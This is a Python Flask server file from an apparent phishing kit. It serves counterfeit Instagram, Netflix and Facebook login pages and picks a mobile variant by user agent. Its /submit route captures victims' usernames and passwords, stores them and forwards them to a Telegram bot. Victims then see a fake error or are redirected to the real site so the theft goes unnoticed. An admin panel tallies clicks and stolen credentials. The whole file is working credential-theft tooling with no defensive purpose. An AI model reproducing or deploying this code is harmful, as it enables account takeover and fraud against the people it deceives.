from flask import render_template,request,redirect,flash,url_for
from server.app import login_manager,logout_user,login_required,login_user
from server.app import app,db
from server.model import Data,Admin,Messengers
from server.sqlfunc import add_data,read_data,delete_data
from server.phishfunc import templates
from server.services.telegram import get_Telegram,update_tele,send_telegram_userdata
from server.services.userSetting import get_user,update_user_pass

from user_agents import parse

with app.app_context():
    db.create_all()



@login_manager.user_loader
def loader_user(username):
    return Admin.query.get(username)


#SOME VARIABLES FOR DEVELOPEMENT
userClicks = 0
UserEnteredPassword = 0




#####################################################################################
#LOGIN AND CONTROL PANEL
@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        user = Admin.query.filter_by(
            username=request.form["username"]).first()
        
        if user is None:
            user = get_user()
            login()

        if user is not None:
            if user.password == request.form["password"]:
                login_user(user)
                return redirect(url_for("index"))
        else:
            flash("Incorrect Username or Password",'error')
    return render_template("adminPanel/login.html")






@app.route('/')
@login_required
def index():
    print(get_Telegram())
    # add_data("Siddhant","Howareyou","Instagram",True)
    return render_template("/adminPanel/controlPanel.html",
                           template=templates
                           ,enumerate=enumerate,
                           userlist=read_data,
                           clicks=userClicks,
                           phishedUsers=UserEnteredPassword,
                           user=get_user,
                           tele=get_Telegram)


@app.route("/logout")
def logout():
    logout_user()
    return redirect(url_for("index"))




##############################################################################################
#PHISHING LINKS ARE HERE
@app.route('/ig_verify')
def ig_verify():
    global userClicks
    userClicks += 1
    return render_template('/phishing/ig_verify/login.html')

@app.route('/insta_followers')
def insta_followers():
    global userClicks
    userClicks += 1
    return render_template('/phishing/insta_followers/login.html')

@app.route('/instagram')
def instagram():
    global userClicks
    userClicks += 1
    return render_template('/phishing/instagram/login.html')

@app.route('/netflix')
def netflix():
    global userClicks
    userClicks += 1
    return render_template('/phishing/netflix/login.html')

@app.route('/facebook')
def facebook():
    global userClicks
    userClicks += 1
    print(request.user_agent)
    user = parse(request.user_agent.string)
    
    if user.is_mobile:
        return render_template('/phishing/facebook/mobile.html')
    else:
        return render_template('/phishing/facebook/login.html')


##################################################################################################
#FUNCTION TO GET PHISHING USERNAMES AND PASSWORDS

@app.route('/submit',methods=['POST'])
@send_telegram_userdata
def submit():
    global UserEnteredPassword
    print(request.user_agent.browser)
    UserEnteredPassword += 1
    template = request.form['template']
    username = request.form["username"]
    password = request.form["password"]
    add_data(username,password,template,isVerified=False)
    print(username," : ",template," : ",password)
    return submit_phishing_data(template=template, username=username, password=password)

# Extract the phishing data processing to a separate function
def submit_phishing_data(template, username, password):
    if template == "Instagram":
        error = "Sorry, your password was incorrect. Please double-check your password."
        return render_template("/phishing/instagram/login.html", error=error)
    elif template == "ig_verify1":
        return render_template('phishing/ig_verify/login2.html')
    elif template == "ig_verify2":
        return render_template('phishing/ig_verify/login3.html')
    elif template == "insta_followers":
        return render_template('phishing/insta_followers/login.html', error=True)
    elif template == "netflix":
        return redirect('https://www.netflix.com/login')
    elif template == "facebook":
        return render_template('https://www.facebook.com')
    return ""



###################################################################################################
#FUNCTION TO DELETE THE SQL DATA TABLE
@app.route('/delete',methods=['POST'])
def delete():
    username = request.form.get('username')
    delete_data(username)
    print(f"Sucessfully Deleted {username}")
    return ""

###################################################################################################
@app.route('/config/<style>',methods=['POST'])
def func_name(style):
    if style == "user&pass":
        oldusername = request.form['oldusername']
        username = request.form['username']
        password = request.form['password']
        update_user_pass(oldusername,username,password)
        return " "
    elif style == "telegram":
        token = request.form['token']
        chatid = request.form['chatid']
        usetele = request.form['use']
        if usetele == "True":
            usetele =True
            update_tele(token,chatid,usetele)
            return ""
        update_tele(token,chatid,False)
        return ""
            
        
if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8000, debug=True)
 
 